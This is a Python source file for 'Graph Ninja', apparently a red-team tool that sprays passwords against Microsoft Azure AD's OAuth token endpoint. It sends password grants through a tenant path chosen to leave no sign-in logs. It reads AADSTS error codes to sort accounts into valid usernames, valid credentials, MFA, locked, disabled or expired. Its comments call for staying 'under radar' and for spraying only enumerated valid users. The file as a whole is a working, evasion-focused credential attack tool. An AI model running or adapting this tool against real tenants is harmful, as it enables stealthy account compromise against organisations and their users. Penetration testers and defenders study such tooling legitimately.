#!/usr/bin/env python3

# GRAPH NINJA
#
# Logless password spraying
# plz do not add threading - trying to keep this under radar at MS too, so don't be insanely loud
# enumerate separately with teams or onedrive, then spray only valids
#
# TLP: MIDNIGHT
#
# 2023.06.26 @nyxgeek - TrustedSec
#

import requests
import argparse

# Define command-line arguments
parser = argparse.ArgumentParser(description='Log into Microsoft Graph.')
parser.add_argument("-u", "--username", help="user to target", metavar='')
parser.add_argument("-U", "--userfile", help="file containing usernames in email format", metavar='')
#parser.add_argument('userfile', help='Userfile with emails to try.')
parser.add_argument("-p", "--password", help='Password for the Microsoft account.')
#parser.add_argument('tenantguids', help='tenantguids to rotate through')
args = parser.parse_args()

def login(username, password):
    headers = {
        "User-Agent": "Microsoft Office/16.0 (Windows NT 10.0; Microsoft Outlook 16.0.12026; Pro",
        "Accept": "application/json",
    }
    body = {
        "resource": "https://graph.windows.net",
        "client_id": "72f988bf-86f1-41af-91ab-2d7cd011db42",
        #"client_id": "72f988bf-86f1-41af-91ab-2d7cd011db47",
        "client_info": '1',
        "grant_type": "password",
        "username": username,
        "password": password,
        "scope": "openid"
    }
    codes = {
        0: ['AADSTS50034'], # INVALID
        1: ['AADSTS50126'], # VALID
        3: ['AADSTS50079', 'AADSTS50076'], # MSMFA
        4: ['AADSTS50158'], # OTHER MFA
        5: ['AADSTS50053'], # LOCKED
        6: ['AADSTS50057'], # DISABLED
        7: ['AADSTS50055'], # EXPIRED
        8: ['AADSTS50128', 'AADSTS50059'], # INVALID TENANT
        9: ['AADSTS700016'] # VALID USER/PASS
    }

    state = -1
    #body['username'] = username

    #response = requests.post("https://login.microsoftonline.com/db3662fa-234a-430c-9d80-2da3ab11ead5/oauth2/token", headers=headers, data=body)
    response = requests.post("https://login.microsoftonline.com/157c51bb-dbe3-4c08-842d-0d566e0396fa/oauth2/token", headers=headers, data=body)

    #fake below this: - okay so that fails bc recognizes invalid tenant guid
    #response = requests.post("https://login.microsoftonline.com/157c51bb-dbe3-4c08-842d-0d566e0396ff/oauth2/token", headers=headers, data=body)


    #response = requests.post("https://login.microsoftonline.com/common/oauth2/token", headers=headers, data=body)

    #response = requests.post(
    #    #url + '/1146cf6d-9b72-4828-bd04-9f1ccb305586/oauth2/token',
    #    #url + '/db3662fa-234a-430c-9d80-2da3ab11ead5/oauth2/token',
    #    url + '/157c51bb-dbe3-4c08-842d-0d566e0396fa/oauth2/token',
    #    headers=headers,
    #    data=body
    #)

    # States
    # 0 = invalid user
    # 1 = valid user
    # 2 = valid user/pass
    # 3 = MS MFA response
    # 4 = third-party MFA?
    # 5 = locked out
    # 6 = acc disabled
    # 7 = pwd expired
    # 8 = invalid tenant response
    # 9 = valid user/pass
    if response.status_code == 200:
        state = 2
    else:
        respErr = response.json()['error_description']
        for k, v in codes.items():
            if any(e in respErr for e in v):
                state = k
                break
        if state == -1:
            #logging.info(f"UNKERR: {respErr}")
            print(f"UNKERR: {respErr}")

    #print(response.cookies.get_dict())
    return state

    #if response.status_code == 200:
    #    print('Login successful.')
    #else:
    #    try:
    #        print(f'{username}:{password}:{response.status_code}')
    #        error_code = response.json()['error_codes'][0]
    #        for status, code in codes.items():
    #            if error_code in code:
    #                return status
    #    except KeyError:
    #        print("Unknown error occurred.")

    #return -1  # Unknown status



if args.username:

    # Call the login function
    status = login(args.username, args.password)
    if status == 9:
        english_status = "VALID ACCOUNT CREDS"
    elif status == 1:
        english_status = "VALID USERNAME"
    elif status == 5:
        english_status = "LOCKED / SMART LOCKOUT"
    elif status == 6:
        english_status = "DISABLED"
    elif status == 7:
        english_status = "EXPIRED - UPDATE PASSWORD"
    else:
        english_status = "INVALID"
    #single user lookup
    print(f'{args.username}:{args.password} - Status: {english_status}')



if args.userfile:

    # Read the file with the usernames
    with open(args.userfile, 'r') as f:
        usernames = f.read().splitlines()

    # Call the login function for each username
    for username in usernames:
        status = login(username, args.password)

        if status == 9:
            english_status = "VALID ACCOUNT CREDS"
        elif status == 1:
            english_status = "VALID USERNAME"
        elif status == 5:
            english_status = "LOCKED / SMART LOCKOUT"
        elif status == 6:
            english_status = "DISABLED"
        elif status == 7:
            english_status = "EXPIRED - UPDATE PASSWORD"
        else:
            english_status = "INVALID"

        print(f'{username}:{args.password} - Status: {english_status}')
